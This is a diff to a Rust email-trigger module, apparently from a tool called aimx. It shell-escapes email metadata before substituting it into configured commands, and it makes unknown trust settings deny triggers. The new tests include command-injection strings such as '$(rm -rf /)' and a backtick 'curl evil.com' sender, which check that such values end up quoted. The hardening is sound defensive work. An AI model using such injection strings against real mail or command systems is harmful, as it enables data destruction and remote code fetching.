@@ -1,5 +1,7 @@
 use crate::config::{MailboxConfig, MatchFilter, OnReceiveRule};
 use crate::ingest::EmailMetadata;
+use shell_escape::escape;
+use std::borrow::Cow;
 use std::path::Path;
 use std::process::Command;
 
@@ -8,15 +10,22 @@ pub struct TriggerContext<'a> {
     pub metadata: &'a EmailMetadata,
 }
 
+fn shell_escape_value(val: &str) -> String {
+    escape(Cow::Borrowed(val)).into_owned()
+}
+
 pub fn substitute_template(command: &str, ctx: &TriggerContext) -> String {
     command
-        .replace("{filepath}", &ctx.filepath.to_string_lossy())
-        .replace("{from}", &ctx.metadata.from)
-        .replace("{to}", &ctx.metadata.to)
-        .replace("{subject}", &ctx.metadata.subject)
-        .replace("{mailbox}", &ctx.metadata.mailbox)
-        .replace("{id}", &ctx.metadata.id)
-        .replace("{date}", &ctx.metadata.date)
+        .replace(
+            "{filepath}",
+            &shell_escape_value(&ctx.filepath.to_string_lossy()),
+        )
+        .replace("{from}", &shell_escape_value(&ctx.metadata.from))
+        .replace("{to}", &shell_escape_value(&ctx.metadata.to))
+        .replace("{subject}", &shell_escape_value(&ctx.metadata.subject))
+        .replace("{mailbox}", &shell_escape_value(&ctx.metadata.mailbox))
+        .replace("{id}", &shell_escape_value(&ctx.metadata.id))
+        .replace("{date}", &shell_escape_value(&ctx.metadata.date))
 }
 
 pub fn matches_filter(filter: &MatchFilter, metadata: &EmailMetadata) -> bool {
@@ -88,7 +97,11 @@ pub fn should_execute_triggers(mailbox_config: &MailboxConfig, metadata: &EmailM
         return metadata.dkim == "pass";
     }
 
-    true
+    eprintln!(
+        "aimx: unknown trust value '{}', denying triggers (fail-closed)",
+        mailbox_config.trust
+    );
+    false
 }
 
 pub fn execute_triggers(mailbox_config: &MailboxConfig, ctx: &TriggerContext) {
@@ -162,7 +175,7 @@ mod tests {
         assert!(result.contains("/var/lib/aimx/catchall/2025-06-01-001.md"));
         assert!(result.contains("alice@gmail.com"));
         assert!(result.contains("agent@test.com"));
-        assert!(result.contains("Hello World"));
+        assert!(result.contains("'Hello World'"));
         assert!(result.contains("catchall"));
         assert!(result.contains("2025-06-01-001"));
         assert!(result.contains("2025-06-01T12:00:00Z"));
@@ -176,9 +189,10 @@ mod tests {
         let filepath = PathBuf::from("/tmp/test.md");
         let ctx = sample_ctx(&filepath, &meta);
 
-        let result = substitute_template("echo '{from}' '{subject}'", &ctx);
-        assert!(result.contains("O'Brien <obrien@test.com>"));
-        assert!(result.contains("Re: \"urgent\" & important"));
+        let result = substitute_template("echo {from} {subject}", &ctx);
+        assert!(result.contains("obrien@test.com"));
+        assert!(result.contains("urgent"));
+        assert!(!result.contains("O'Brien <obrien@test.com>"));
     }
 
     #[test]
@@ -549,7 +563,7 @@ mod tests {
             on_receive: vec![OnReceiveRule {
                 rule_type: "cmd".to_string(),
                 command: format!(
-                    "echo '{{from}} {{subject}}' > {}",
+                    "echo {{from}} {{subject}} > {}",
                     output_file.to_string_lossy()
                 ),
                 r#match: None,
@@ -717,6 +731,91 @@ mod tests {
         assert!(
             marker.exists(),
             "Trigger should fire for DKIM pass with trust=verified"
+        );
+    }
+
+    #[test]
+    fn substitute_template_escapes_shell_metacharacters() {
+        let mut meta = sample_metadata();
+        meta.subject = "$(rm -rf /)".to_string();
+        meta.from = "`curl evil.com`@attacker.com".to_string();
+        let filepath = PathBuf::from("/tmp/test.md");
+        let ctx = sample_ctx(&filepath, &meta);
+
+        let result = substitute_template("echo {from} {subject}", &ctx);
+        assert!(
+            result.contains("'$(rm -rf /)'"),
+            "command substitution should be single-quoted: {result}"
+        );
+        assert!(
+            result.contains("'`curl evil.com`@attacker.com'"),
+            "backtick injection should be single-quoted: {result}"
+        );
+    }
+
+    #[test]
+    fn substitute_template_shell_injection_does_not_execute() {
+        let tmp = tempfile::TempDir::new().unwrap();
+        let marker = tmp.path().join("pwned");
+        let mut meta = sample_metadata();
+        meta.subject = format!("$(touch {})", marker.to_string_lossy());
+        let filepath = tmp.path().join("test.md");
+        let ctx = sample_ctx(&filepath, &meta);
+
+        let config = MailboxConfig {
+            address: "*@test.com".to_string(),
+            trust: "none".to_string(),
+            trusted_senders: vec![],
+            on_receive: vec![OnReceiveRule {
+                rule_type: "cmd".to_string(),
+                command: "echo {subject}".to_string(),
+                r#match: None,
+            }],
+        };
+
+        execute_triggers(&config, &ctx);
+        assert!(
+            !marker.exists(),
+            "Shell injection should not execute commands"
+        );
+    }
+
+    #[test]
+    fn invalid_trust_value_denies_triggers() {
+        let mut meta = sample_metadata();
+        meta.dkim = "pass".to_string();
+        let config = MailboxConfig {
+            address: "*@test.com".to_string(),
+            trust: "verfied".to_string(),
+            trusted_senders: vec![],
+            on_receive: vec![],
+        };
+        assert!(!should_execute_triggers(&config, &meta));
+    }
+
+    #[test]
+    fn invalid_trust_value_blocks_trigger_execution() {
+        let tmp = tempfile::TempDir::new().unwrap();
+        let marker = tmp.path().join("should_not_exist");
+        let meta = sample_metadata();
+        let filepath = tmp.path().join("test.md");
+        let ctx = sample_ctx(&filepath, &meta);
+
+        let config = MailboxConfig {
+            address: "*@test.com".to_string(),
+            trust: "typo".to_string(),
+            trusted_senders: vec![],
+            on_receive: vec![OnReceiveRule {
+                rule_type: "cmd".to_string(),
+                command: format!("touch {}", marker.to_string_lossy()),
+                r#match: None,
+            }],
+        };
+
+        execute_triggers(&config, &ctx);
+        assert!(
+            !marker.exists(),
+            "Trigger should not fire for unknown trust value"
         );
     }
 }
